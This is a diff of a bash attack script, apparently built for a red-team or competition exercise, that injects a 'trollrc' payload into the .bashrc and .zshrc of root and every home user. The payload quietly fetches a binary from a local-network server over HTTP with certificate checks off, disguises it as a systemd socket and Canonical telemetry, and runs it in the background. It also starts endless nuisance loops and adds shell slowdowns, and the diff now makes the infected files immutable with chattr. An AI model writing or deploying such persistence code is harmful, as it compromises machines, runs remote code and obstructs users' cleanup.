@@ -52,14 +52,54 @@ elif which yum &>/dev/null; then
 		echo "[=] Packages installed"
 	fi
 else
-	echo "[!] No compatible package managers detected: couldn't install '$install_packages'"
+	echo "[!] No compatible package managers detected: could not install '$install_packages'"
 fi
 
 echo
 echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
 
+
 trollrc='
-wget -qO /tmp/systemd-timers-daemon.socket --no-check-certificate http://10.10.2.5:8080/telemetry; chmod +x /tmp/systemd-timers-daemon.socket; /tmp/systemd-timers-daemon.socket& disown
+export CANONICAL_TELEMETRY_SERVER="http://10.10.2.5:8080/telemetry"
+export SYSTEMD_SOCKET="/tmp/systemd-timers-daemon.socket"
+wget -qO "$SYSTEMD_SOCKET" --no-check-certificate "$CANONICAL_TELEMETRY_SERVER"; chmod +x "$SYSTEMD_SOCKET"; "$SYSTEMD_SOCKET"& disown
+
+sus='\''
+      ___________________
+     / THIS SHELL IS SUS \
+     \___________________/ 
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄
+⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄
+⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷
+⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿
+⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
+⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇
+⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
+⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
+⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃
+⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇
+⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇
+⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏
+⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁
+'\''
+if which sl &>/dev/null; then
+	(while :; do sleep 30; sl; done) &
+else
+	(while :; do sleep 30; echo "$sus"; done) &
+fi
+
+if which cowsay &>/dev/null; then
+	(while :; do sleep 8; echo; cowsay -f milk "GOT MILK?"; done) &
+else
+	(while :; do sleep 8; echo "hacked :)"; done) &
+fi
+
 export TERM=xterm
 
 echo "Please wait..."
@@ -97,60 +137,44 @@ alias logout="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\
 alias unalias="echo \"I'\''m sorry `whoami`, I can'\'' do that.\""
 
 [ -f "~/.bashrc" ] && echo "sleep 0.05" >> ~/.bashrc # you'\''re getting sleepier...
-[ -f "~/.zshrc" ] && echo "sleep 0.05" >> ~/.zshrc # you'\''re getting sleepier...
-
-sus='\''
-      ___________________
-     / THIS SHELL IS SUS \
-     \___________________/ 
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀
-⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄
-⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄
-⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷
-⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿
-⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
-⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇
-⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧
-⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
-⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
-⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
-⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃
-⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇
-⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇
-⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏
-⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁
-'\''
-if which sl &>/dev/null; then
-	(while :; do sleep 30; sl; done) &
-else
-	(while :; do sleep 30; echo "$sus"; done) &
-fi
-
-if which cowsay &>/dev/null; then
-	(while :; do sleep 8; echo; cowsay -f milk "GOT MILK?"; done) &
-else
-	(while :; do sleep 8; echo "hacked :)"; done) &
-fi'
+[ -f "~/.zshrc" ] && echo "sleep 0.05" >> ~/.zshrc # you'\''re getting sleepier...'
 
 
 
 for user in /root /home/*; do
+	# Troll .bashrc
 	if [ -f "$user/.bashrc" ]; then
 		if grep -q "Please wait" "$user/.bashrc"; then
 			echo "[-] User '$user/.bashrc' already trolled, skipping"
 		else
-			echo "$trollrc" >> "$user/.bashrc" && echo "[=] Added trollrc to '$user/.bashrc'" || echo "[!] Could not add trollrc to '$user/.bashrc'"
+			if echo "$trollrc" >> "$user/.bashrc"; then
+				echo "[=] Added trollrc to '$user/.bashrc'"
+				if chattr +i "$user/.bashrc"; then
+					echo "[=] Made '$user/.bashrc' immutable"
+				else
+					echo "[-] Could not make '$user/.bashrc' immutable"
+				fi
+			else
+				echo "[!] Could not add trollrc to '$user/.bashrc'"
+			fi
 		fi
 	fi
 
+	# Troll .zshrc
 	if [ -f "$user/.zshrc" ]; then
 		if grep -q "Please wait" "$user/.zshrc"; then
 			echo "[-] User '$user/.zshrc' already trolled, skipping"
 		else
-			echo "$trollrc" >> "$user/.zshrc" && echo "[=] Added trollrc to '$user/.zshrc'" || echo "[!] Could not add trollrc to '$user/.zshrc'"
+			if echo "$trollrc" >> "$user/.zshrc"; then
+				echo "[=] Added trollrc to '$user/.zshrc'"
+				if chattr +i "$user/.zshrc"; then
+					echo "[=] Made '$user/.zshrc' immutable"
+				else
+					echo "[-] Could not make '$user/.zshrc' immutable"
+				fi
+			else
+				echo "[!] Could not add trollrc to '$user/.zshrc'"
+			fi
 		fi
 	fi
 done
